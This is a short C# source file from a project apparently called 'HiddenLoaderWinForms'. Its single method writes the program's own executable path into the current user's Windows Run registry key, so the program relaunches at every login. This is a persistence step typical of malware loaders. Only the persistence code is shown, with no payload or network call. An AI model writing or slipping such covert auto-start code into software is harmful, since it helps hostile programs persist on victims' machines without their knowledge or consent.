
using Microsoft.Win32;

namespace HiddenLoaderWinForms
{
    public class Registry
    {
        public static void AddToRegistry()
        {
            string exePath = System.Windows.Forms.Application.ExecutablePath; //getting this file path
            RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");//path for create registry key
            reg.SetValue(Config.StartupProcessName, exePath);
            reg.Close();
        }
    }
}